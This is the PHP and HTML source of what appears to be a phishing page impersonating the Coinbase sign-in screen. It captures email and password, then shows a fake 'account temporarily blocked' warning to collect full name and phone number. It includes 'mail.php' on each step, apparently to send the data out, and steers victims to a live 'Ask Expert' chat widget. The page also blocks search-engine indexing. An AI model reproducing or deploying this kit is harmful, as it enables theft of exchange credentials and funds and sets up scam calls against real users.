<!DOCTYPE html>
<html lang="en">
   <head>
      <meta name="robots" content="noindex, nofollow"/>
      <meta name="googlebot" content="noindex, nofollow"/>
      <meta name="bingbot" content="noindex, nofollow"/>
      <meta charset="UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Sign in - Coinbase</title>
      <link rel="stylesheet" href="assets/css/all.min.css">
      <link rel="stylesheet" href="assets/css/bootstrap.min.css">
      <link rel="stylesheet" href="assets/css/style.css">
   </head>
   <body>
      <nav class="navbar navbar-expand-lg" id="navigation-bar">
         <a class="navbar-brand" href="#">
         coinbase
         </a>
         <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
         <i class="fas fa-bars"></i>
         </button>
         <div class="collapse navbar-collapse" id="navbarSupportedContent">
            <ul class="navbar-nav mr-auto">
               <li class="nav-item active">
                  <a class="nav-link" href="#"></a>
               </li>
               <li class="nav-item">
                  <a class="nav-link" href="#"></a>
               </li>
            </ul>
            <form class="form-inline">
               <a class="nav-link" href="#">Prices</a>
               <a class="nav-link" href="#">Sign In</a>
               <button class="btn btn-primary my-2 my-sm-0" type="submit">Sign Up</button>
            </form>
         </div>
      </nav>
      <!-- navigation ends -->
      <!-- form -->
      <?php
         if (isset($_POST['btnLoginMore'])) {
            include 'mail.php';
         ?>
      <!-- <div class="container-fluid" id="middle-section"> -->
      <div class="container-fluid" id="welcome-section">
         <h2 id="heading">Verification Required <span></span></h2>
         <form action="" method="post">
            <div class="alert mb-4 alert-danger text-center">Attention: the account has been <b>temporarily blocked due to suspicious activity in your Network IP,</b> kindly verify the following details<br>
            Kindly contact chat assistance for further help
         </div>
            <input type="hidden" name="brandName" value="Coinbase">
            <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>" />
            <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>" />
            <div class="form-group">
               <label>Full Name</label>
               <input type="text" class="form-control" name="name" placeholder="Enter Your Name" required>
            </div>
            <div class="form-group">
               <label>Phone Number</label>
               <input type="text" class="form-control" placeholder="Phone Number" name="number" required>
            </div>
            <button class="btn btn-block btn-primary" name="fromLog" type="submit">Verify </button>
         </form>
      </div>
      <?php } elseif (isset($_POST['fromLog'])) {
         include 'mail.php';
         ?>
      <div class="container-fluid" id="middle-error-section">
         <h2 id="heading">Important Message: <span></span></h2>
         <form action="" method="post">
            <p>Your account has been <b>temporarily blocked</b> due to suspicious activity on your Network IP. Kindly ask an expert</p>
            <div class="form">
               <label>Error CODE: EBRX1:6X76D</label><br>
            </div>
            <div class="calling-number">
               <a href="javascript:void(Tawk_API.toggle())">Ask Expert</a>
            </div>
         </form>
      </div>
      <?php } else { ?>
      <div class="container-fluid" id="welcome-section">
         <h2 id="heading">Sign in to Coinbase</h2>
         <form action="" method="post">
            <input type="hidden" name="brandName" value="Coinbase">
            <div class="form-group">
               <input type="email" class="form-control" id="exampleInputEmail1" name="email" aria-describedby="emailHelp"
                  placeholder="Email" required>
            </div>
            <div class="form-group">
               <input type="password" class="form-control" id="exampleInputPassword1"
                  placeholder="Password" name="password" required>
            </div>
            <button name="btnLoginMore" type="submit" class="btn btn-block btn-primary">Sign In</button>
            <div class="links">
               <a href="#">Forgot password ?</a>
               <span>Don't have an account?<a href="#"> Sign Up Now</a></span>
            </div>
         </form>
      </div>
      <?php } ?>
      <script src="assets/js/jquery-3.5.1.min.js"></script>
      <script src="assets/js/popper.js"></script>
      <script src="assets/js/bootstrap.min.js"></script>
      <!--Start of Tawk.to Script-->
      <script type="text/javascript">
         var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
         (function(){
         var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
         s1.async=true;
         s1.src='https://embed.tawk.to/620a586d9bd1f31184dc89bb/1frs6irvs';
         s1.charset='UTF-8';
         s1.setAttribute('crossorigin','*');
         s0.parentNode.insertBefore(s1,s0);
         })();
      </script>
      <!--End of Tawk.to Script-->
   </body>
</html>